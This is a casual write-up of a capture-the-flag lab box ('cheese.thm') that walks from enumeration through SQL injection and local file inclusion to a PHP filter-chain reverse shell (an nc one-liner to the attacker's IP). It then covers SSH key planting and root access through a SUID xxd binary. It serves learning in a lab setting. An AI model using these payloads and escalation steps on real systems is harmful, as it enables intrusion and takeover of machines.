http://10.10.248.124:62078/
This was mind bogging for me, completed in around 2 to 3 hrs

## Enumeration
nmapped the IP, got a lot of open ports
I banner grabbed all of them and check if anything is there
	found some telnet sessions that auto-disconnect, did some digging and got nothing
also fuuf'd directories simultaneously

There was also a login page on the `http://cheese.thm/login.php`
then I SQL mapped the page and  an additional fun fact was that I can capture the requests on burp and then make sqlmap analyze it, at first i didn't even find it in the man page 
`┌──(namura㉿namu)-[~/thm/cheese]
└─$ sqlmap -r login.req `
got something 
`got a 302 redirect to 'http://10.10.248.124/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] 
`
Then i followed the URI and bam we are in
while the sqlmap was not in my mind I used burp intruder to bruteforce usernames and passwords to the form on the form
also I did some `fuf -w /usr/share/wordlists/sqlmap.txt -X POST -u http://cheese.thm/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 227` but got nowhere
	`POST /login.php HTTP/1.1
	Host: 10.10.248.124
	Content-Length: 29
	Cache-Control: max-age=0
	Origin: http://10.10.248.124
	Content-Type: application/x-www-form-urlencoded
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
	Sec-GPC: 1
	Accept-Language: en-US,en;q=0.5
	Referer: http://10.10.248.124/login.php
	Accept-Encoding: gzip, deflate, br
	Cookie: Ipswitch={
	Connection: keep-alive
	
	username=admin&password=admin`
using the https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads
and many others lists and damn it was gruesome

then I mapped the site and got a http://10.10.248.124/secret-script.php?file=php://filter/resource=messages.html
which was a LFI and so i checked the code exec http://10.10.248.124/secret-script.php?file=php://filter/resource=/etc/passwd
bam, got the passwd file and shadow was not permitted obv

Then I got stuck.. again
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers
got this and read a whole lotta text but nothing
then https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it
and we used this script https://github.com/synacktiv/php_filter_chain_generator

and then I used
`$ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc myIP port >/tmp/f"); ?>' | grep '^php' > payload.txt`
and also 
`$ curl -s "http://cheese.thm/secret-script.php?file=$(cat payload.txt)"`

then we finally get a shell as www-data
then I linpeas.sh'd it and found a CVE-2021-3560 which was not applicable lol
and then found a juicy writable file 
`/home/comte/.ssh/authorized_keys
/etc/systemd/system/exploit.timer`
then I generated a key `$ ssh-keygen -f id_ed25519 -t ed25519` and inserted the .pub to the file 

and we got in as comte

then I `sudo -l`'d  and found some 
`comte@ip-10-10-84-217:~$ sudo -l
User comte may run the following commands on ip-10-10-84-217:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
`

and i searched it on gtfobins but none related to it also this too:
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers

then I used gpt to change the contents of the file and then made it spawn a shell to root but it didn;t work 
the exploit.service file was non-mutable huhu kho yesto

then I saw that the exploit.service had xxd on it with SUID bit yay~
`comte@ip-10-10-84-217:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
`
then i checked xxd and it actually worked
I used it to get the /etc/shadow file 
and then I unshadow'd and cracked it using john but it was not in complete form so it didn't work
then I realised that i could just do this again 
`comte@cheesectf:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFcXGUzqIgioBomAfMAYAEgw4fEay2i11v4s8WdsW81F namura@namu
' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys`
and  

I ssh'd as root
and we got both the flags yay~